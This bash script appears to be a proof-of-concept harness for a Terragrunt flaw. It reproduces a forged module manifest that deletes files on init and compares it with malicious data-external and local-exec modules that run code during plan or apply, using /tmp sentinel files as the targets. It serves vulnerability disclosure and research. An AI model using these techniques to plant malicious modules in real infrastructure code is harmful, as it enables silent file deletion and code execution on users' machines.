#!/usr/bin/env bash
# Side-by-side comparison of three attack channels in a malicious module:
#
#   1. forged .terragrunt-module-manifest -> deletes during  init
#   2. data "external"                    -> deletes during  plan
#   3. local-exec provisioner             -> deletes during  apply
#
# All three end up at the same primitive (delete files in /tmp). They
# differ on:
#   - which terragrunt subcommand the user has to invoke for the deletion
#     to fire
#   - whether the user sees ANY indication in the terraform output (init
#     prints nothing about cleanup, plan/apply print the resource/data
#     block being evaluated)
#   - capability ceiling -- local-exec/data-external are full RCE; the
#     manifest bug is delete-only
#
# Each scenario gets a fresh attacker git repo and a fresh consumer dir
# so the runs are independent.
#
# Configuration
#   TERRAGRUNT_BIN     terragrunt binary (default: terragrunt on PATH)
#   SKIP_APPLY=1       skip the local-exec scenario (apply takes longer
#                       and writes state)

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TERRAGRUNT_BIN="${TERRAGRUNT_BIN:-terragrunt}"

SENTINELS=(
  /tmp/repro-manifest-traversal-sentinel-1.txt
  /tmp/repro-manifest-traversal-sentinel-2.txt
  /tmp/repro-manifest-traversal-sentinel-3.txt
)
RCE_MARKER=/tmp/repro-manifest-traversal-rce-marker.txt

reset_sentinels() {
  for f in "${SENTINELS[@]}"; do
    printf 'must survive\n' > "$f"
  done
  rm -f "$RCE_MARKER"
}

count_deleted() {
  local n=0
  for f in "${SENTINELS[@]}"; do
    test -f "$f" || n=$((n + 1))
  done
  echo "$n"
}

verdict() {
  local label=$1
  local trigger_cmd=$2
  local deleted=$3
  local rce=no
  test -f "$RCE_MARKER" && rce=yes

  printf '\n  %-30s deleted=%d/3  rce_marker=%s  trigger=%q\n' \
    "$label" "$deleted" "$rce" "$trigger_cmd"
}

run_scenario() {
  local label=$1; shift
  local module_dir=$1; shift
  local terraform_cmd=$1; shift
  local pretty_cmd=$1; shift

  local repo="$SCRIPT_DIR/.scratch/$label.git"
  local work="$SCRIPT_DIR/.scratch/$label-work"
  local consumer="$SCRIPT_DIR/.scratch/$label-consumer"

  rm -rf "$repo" "$work" "$consumer"
  mkdir -p "$work" "$consumer"

  cp "$module_dir"/* "$work/" 2>/dev/null || true
  if [[ "$label" == manifest-bug ]]; then
    "$SCRIPT_DIR/forge_bin" \
      "$work/.terragrunt-module-manifest" \
      "${SENTINELS[@]}" >/dev/null
  fi

  ( cd "$work" \
    && git init -q -b main . \
    && git config user.email repro@example.com \
    && git config user.name  repro \
    && git add -A \
    && git commit -q -m "$label" \
  )
  git clone -q --bare "$work" "$repo"

  cat > "$consumer/terragrunt.hcl" <<EOF
terraform {
  source = "git::file://$repo"
}
EOF

  reset_sentinels
  ( cd "$consumer" && eval "$TERRAGRUNT_BIN $terraform_cmd" ) >/dev/null 2>&1 || true

  verdict "$label" "$pretty_cmd" "$(count_deleted)"
}

echo "==> building forge tool"
( cd "$SCRIPT_DIR/forge" && go build -o "$SCRIPT_DIR/forge_bin" . )

echo "==> using terragrunt: $($TERRAGRUNT_BIN --version 2>&1 | head -1)"
echo
echo "Scenarios (each is an independent attacker git repo):"

run_scenario manifest-bug \
  "$SCRIPT_DIR/attacker-module" \
  'run -- init -backend=false' \
  'terragrunt run -- init -backend=false'

run_scenario data-external \
  "$SCRIPT_DIR/attacker-data-external" \
  'run -- plan -input=false -lock=false' \
  'terragrunt run -- plan'

if [[ "${SKIP_APPLY:-0}" != 1 ]]; then
  run_scenario local-exec \
    "$SCRIPT_DIR/attacker-local-exec" \
    'run -- apply -auto-approve -input=false -lock=false' \
    'terragrunt run -- apply -auto-approve'
else
  echo
  echo "  local-exec                     SKIPPED (set SKIP_APPLY=0 to include)"
fi

echo
echo "Reading the table:"
echo "  deleted=N/3       how many sentinel files in /tmp were unlinked"
echo "  rce_marker=yes    /tmp/repro-manifest-traversal-rce-marker.txt was created"
echo "                    (proves the channel is full code execution, not delete-only)"
echo "  trigger=<cmd>     the terragrunt subcommand the victim had to run"
echo
echo "Take-away: the manifest bug is the only channel that fires on plain init."
echo "It is also the only channel that does NOT show up in tofu/terraform output."
echo "local-exec and data-external can do strictly more (RCE > delete) but require"
echo "the user to actually plan or apply against the malicious module."

# leave .scratch in place for inspection; cleanup.sh removes it
